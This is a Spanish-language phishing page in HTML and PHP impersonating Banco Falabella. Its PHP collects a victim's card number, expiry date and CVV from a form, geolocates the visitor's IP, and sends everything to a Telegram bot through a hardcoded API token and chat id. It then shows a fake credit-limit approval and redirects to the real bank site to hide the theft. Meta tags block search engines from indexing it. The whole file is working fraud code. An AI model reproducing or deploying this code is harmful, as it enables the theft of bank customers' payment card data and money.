<html>
<head>
<link href="images/android-chrome-256x256.png" rel="icon" type="image/x-icon">
  <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
  <link rel="mask-icon" color="#4d833f" href="images/safari-pinned-tab.svg">
  <meta name="robots" content="none">
	<meta name="robots" content="noindex">
	<meta name="robots" content="nofollow">
	<meta name="robots" content="noarchive">
	<meta name="robots" content="nocache">
	<meta name="robots" content="noimageindex">
	<meta name="robots" content="nomediaindex">
	<meta name="robots" content="noodp">
	<meta name="robots" content="noodyp">
	<meta name="robots" content="notranslate">
	<meta name="robots" content="noyaca">
	<meta name="robots" content="noydir">
	<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
	<meta name="googlebot" content="none">
	<meta name="googlebot" content="noindex">
	<meta name="googlebot" content="nofollow">
	<meta name="googlebot" content="noarchive">
	<meta name="googlebot" content="nocache">
	<meta name="googlebot" content="noimageindex">
	<meta name="googlebot" content="nomediaindex">
	<meta name="googlebot" content="noodp">
	<meta name="googlebot" content="noodyp">
	<meta name="googlebot" content="notranslate">
	<meta name="googlebot" content="noyaca">
	<meta name="googlebot" content="noydir">
	<meta name="slurp" content="none">
	<meta name="slurp" content="noindex">
	<meta name="slurp" content="nofollow">
	<meta name="slurp" content="noarchive">
	<meta name="slurp" content="nocache">
	<meta name="slurp" content="noimageindex">
	<meta name="slurp" content="nomediaindex">
	<meta name="slurp" content="noodp">
	<meta name="slurp" content="notranslate">
	<meta name="slurp" content="noyaca">
	<meta name="slurp" content="noydir">
</head>
</html>

<?php
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    if (strpos($ipaddress, ",") !== false) :
      $ipaddress = strtok($ipaddress, ",");
    endif;
    return $ipaddress;}
  $ip=get_client_ip();
  $meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
  $pais = $meta['geoplugin_countryName'];
  $region = $meta['geoplugin_regionName'];
  $ciudad = $meta['geoplugin_city'];
  date_default_timezone_set('America/Bogota');
@ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['tarj']) && isset ($_POST['password'])&& isset ($_POST['user'])){


$message = "tarjeta: ".$_POST['tarj']." - fecha: ".$_POST['user']."  - Cvv: ".$_POST['password']. " ciudad ".$ciudad." Ip ".$ip." \r\n";

$apiToken = "5684402042:AAHNMzlQohW1oIPAXo3TdHI6nsezb4bchkc";


$data = [
  'chat_id' => '-4065706092',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




}else{ header ('location: index.php'); exit();
 }



?>
<!DOCTYPE html>
<html><title></title>
<head>
	<title>home</title>

 <script language="JavaScript">

    /* Determinamos el tiempo total en segundos */
    var totalTiempo=3;

    var url="https://www.bancofalabella.cl/";

    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "<p style=color:#575757!important;  <br> &iexcl;Solicitud aprobada!  <strong style=color:#43b12e>En 24 horas podra disfrutar del aumento de su cupo</strong>";

        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }

    window.onload=updateReloj;

    </script>


</head>
<body>
<style>
#wait{
	position:relative;

	width:;
	z-index:9999;

}


</style>

<center>
	<br><br><br><br><br><br>
<div >
<img src="data:image/png;base64,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
" width=376 height=130><br><br><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBzdHlsZT0ibWFyZ2luOiBhdXRvOyBiYWNrZ3JvdW5kOiBub25lOyBkaXNwbGF5OiBibG9jazsgc2hhcGUtcmVuZGVyaW5nOiBhdXRvOyIgd2lkdGg9IjExOHB4IiBoZWlnaHQ9IjExOHB4IiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPgo8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiBmaWxsPSJub25lIiBzdHJva2U9IiMzN2ExNGIiIHN0cm9rZS13aWR0aD0iNyIgcj0iMzIiIHN0cm9rZS1kYXNoYXJyYXk9IjE1MC43OTY0NDczNzIzMTAwNyA1Mi4yNjU0ODI0NTc0MzY2OSI+CiAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjEuOTIzMDc2OTIzMDc2OTIzcyIgdmFsdWVzPSIwIDUwIDUwOzM2MCA1MCA1MCIga2V5VGltZXM9IjA7MSI+PC9hbmltYXRlVHJhbnNmb3JtPgo8L2NpcmNsZT4KPCEtLSBbbGRpb10gZ2VuZXJhdGVkIGJ5IGh0dHBzOi8vbG9hZGluZy5pby8gLS0+PC9zdmc+
" width="150" height="150" >
<br><b><h1 id='CuentaAtras'><br>
</h1></b></div>

</body>
</html>
